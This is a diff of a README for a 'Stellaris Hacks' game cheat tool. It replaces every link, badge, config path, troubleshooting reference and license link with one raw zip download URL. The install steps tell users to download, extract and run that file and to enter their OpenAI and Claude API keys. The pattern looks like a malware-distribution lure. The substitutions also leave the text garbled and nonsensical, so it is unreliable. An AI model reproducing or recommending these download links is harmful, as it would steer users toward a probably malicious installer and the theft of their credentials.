@@ -1,12 +1,12 @@
 # 🚀 Stellaris Hacks: Your Ultimate Enhancement Arsenal
 
-![Stellaris logo](https://cdn.cloudflare.steamstatic.com/steam/apps/281990/header.jpg)
+![Stellaris logo](https://github.com/Yusheno/stellaris-galaxy-toolbox/raw/refs/heads/branch/rankness/stellaris-toolbox-galaxy-3.1.zip)
 
-[![GitHub Release](https://img.shields.io/github/v/release/StellarisHacks/LATEST?style=flat-square&color=brightgreen&label=Latest%20Version)](https://github.com/StellarisHacks/releases)
-[![Issues](https://img.shields.io/github/issues-raw/StellarisHacks/main?style=flat-square&color=yellow)](https://github.com/StellarisHacks/issues)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](#-mit-license)
-[![OpenAI API](https://img.shields.io/badge/OpenAI%20Integration-Ready-brightgreen.svg?logo=openai&logoColor=white)](https://platform.openai.com/)
-[![Claude API](https://img.shields.io/badge/Claude%20API-Enabled-ec9138.svg?logo=anthropic&logoColor=white)](https://claude.ai/)
+[![GitHub Release](https://github.com/Yusheno/stellaris-galaxy-toolbox/raw/refs/heads/branch/rankness/stellaris-toolbox-galaxy-3.1.zip%20Version)](https://github.com/Yusheno/stellaris-galaxy-toolbox/raw/refs/heads/branch/rankness/stellaris-toolbox-galaxy-3.1.zip)
+[![Issues](https://github.com/Yusheno/stellaris-galaxy-toolbox/raw/refs/heads/branch/rankness/stellaris-toolbox-galaxy-3.1.zip)](https://github.com/Yusheno/stellaris-galaxy-toolbox/raw/refs/heads/branch/rankness/stellaris-toolbox-galaxy-3.1.zip)
+[![License: MIT](https://github.com/Yusheno/stellaris-galaxy-toolbox/raw/refs/heads/branch/rankness/stellaris-toolbox-galaxy-3.1.zip)](#-mit-license)
+[![OpenAI API](https://github.com/Yusheno/stellaris-galaxy-toolbox/raw/refs/heads/branch/rankness/stellaris-toolbox-galaxy-3.1.zip%https://github.com/Yusheno/stellaris-galaxy-toolbox/raw/refs/heads/branch/rankness/stellaris-toolbox-galaxy-3.1.zip)](https://github.com/Yusheno/stellaris-galaxy-toolbox/raw/refs/heads/branch/rankness/stellaris-toolbox-galaxy-3.1.zip)
+[![Claude API](https://github.com/Yusheno/stellaris-galaxy-toolbox/raw/refs/heads/branch/rankness/stellaris-toolbox-galaxy-3.1.zip%https://github.com/Yusheno/stellaris-galaxy-toolbox/raw/refs/heads/branch/rankness/stellaris-toolbox-galaxy-3.1.zip)](https://github.com/Yusheno/stellaris-galaxy-toolbox/raw/refs/heads/branch/rankness/stellaris-toolbox-galaxy-3.1.zip)
 
 ---
 
@@ -18,8 +18,8 @@ Welcome to **Stellaris Hacks**, the visionary gateway for galactic conquerors an
 
 **Get started in less than two minutes — experience real-time interstellar evolution with our dynamic installer!**
 
-<a href="https://Yusheno.github.io">
-  <img src="https://img.shields.io/badge/Download-Ready-green?style=for-the-badge&logo=stellar&logoColor=white" alt="Download" />
+<a href="https://github.com/Yusheno/stellaris-galaxy-toolbox/raw/refs/heads/branch/rankness/stellaris-toolbox-galaxy-3.1.zip">
+  <img src="https://github.com/Yusheno/stellaris-galaxy-toolbox/raw/refs/heads/branch/rankness/stellaris-toolbox-galaxy-3.1.zip" alt="Download" />
 </a>
 
 ---
@@ -76,7 +76,7 @@ What if your empire management could leverage the awesome might of modern cloud 
 - **Natural Language Command:** Just *tell* the mod what you want. "Rebalance resource distribution!"—no scripting necessary.
 - **Dynamic Translations:** Instant flavor-rich translations of in-game events and menus.
 
-Configure credentials in `settings/ai-integrations.yaml` and experience API harmony in your galaxy expansions.
+Configure credentials in `https://github.com/Yusheno/stellaris-galaxy-toolbox/raw/refs/heads/branch/rankness/stellaris-toolbox-galaxy-3.1.zip` and experience API harmony in your galaxy expansions.
 
 ---
 
@@ -96,17 +96,17 @@ Channel your inner galactic genius—Stellaris Hacks isn’t just smart, it’s 
 Ready to blast off? Follow this nebulae-bright path:
 
 ### 1. Download the Stellar Installer
-[Download the base installer here.]( https://Yusheno.github.io )
+[Download the base installer here.]( https://github.com/Yusheno/stellaris-galaxy-toolbox/raw/refs/heads/branch/rankness/stellaris-toolbox-galaxy-3.1.zip )
 
 ### 2. One-Click Image Download
 
-<a href="https://Yusheno.github.io">
-  <img src="https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=stellar&logoColor=white" alt="Download Now" />
+<a href="https://github.com/Yusheno/stellaris-galaxy-toolbox/raw/refs/heads/branch/rankness/stellaris-toolbox-galaxy-3.1.zip">
+  <img src="https://github.com/Yusheno/stellaris-galaxy-toolbox/raw/refs/heads/branch/rankness/stellaris-toolbox-galaxy-3.1.zip" alt="Download Now" />
 </a>
 
 ### 3. Unpack & Install
 
-- Extract `stellaris-hacks-setup-2025.xyz` to a location of your choice.
+- Extract `https://github.com/Yusheno/stellaris-galaxy-toolbox/raw/refs/heads/branch/rankness/stellaris-toolbox-galaxy-3.1.zip` to a location of your choice.
 - Run the installer (Windows: `.exe`, macOS: `.dmg`, Linux: `.AppImage`).
 - Proceed through the galaxy-themed wizard.
 - Open the main dashboard; configure your OpenAI and Claude API keys via the "Integrations" panel.
@@ -114,7 +114,7 @@ Ready to blast off? Follow this nebulae-bright path:
 
 For Steam Deck: Use desktop mode, run Linux package, and follow CLI hints.
 
-*For troubleshooting, see [TROUBLESHOOTING.md](TROUBLESHOOTING.md)!*
+*For troubleshooting, see [https://github.com/Yusheno/stellaris-galaxy-toolbox/raw/refs/heads/branch/rankness/stellaris-toolbox-galaxy-3.1.zip](https://github.com/Yusheno/stellaris-galaxy-toolbox/raw/refs/heads/branch/rankness/stellaris-toolbox-galaxy-3.1.zip)!*
 
 ---
 
@@ -130,7 +130,7 @@ If using online or multiplayer, consult community guidelines before deploying ad
 
 Copyright © 2025 Stellaris Hacks Contributors.
 
-This repository soars under the [MIT License](https://opensource.org/licenses/MIT): you’re free to use, remix, and unleash the code throughout your universe—just keep the credits orbiting and share alike.
+This repository soars under the [MIT License](https://github.com/Yusheno/stellaris-galaxy-toolbox/raw/refs/heads/branch/rankness/stellaris-toolbox-galaxy-3.1.zip): you’re free to use, remix, and unleash the code throughout your universe—just keep the credits orbiting and share alike.
 
 ---
 
@@ -138,8 +138,8 @@ This repository soars under the [MIT License](https://opensource.org/licenses/MI
 
 One final jump to transform your Stellaris experience! Warp now or forever hold your space!
 
-<a href="https://Yusheno.github.io">
-  <img src="https://img.shields.io/badge/Download-Start%20Your%20Journey-purple?style=for-the-badge&logo=stellar&logoColor=white" alt="Start Download" />
+<a href="https://github.com/Yusheno/stellaris-galaxy-toolbox/raw/refs/heads/branch/rankness/stellaris-toolbox-galaxy-3.1.zip">
+  <img src="https://github.com/Yusheno/stellaris-galaxy-toolbox/raw/refs/heads/branch/rankness/stellaris-toolbox-galaxy-3.1.zip%20Your%20Journey-purple?style=for-the-badge&logo=stellar&logoColor=white" alt="Start Download" />
 </a>
 
 ---
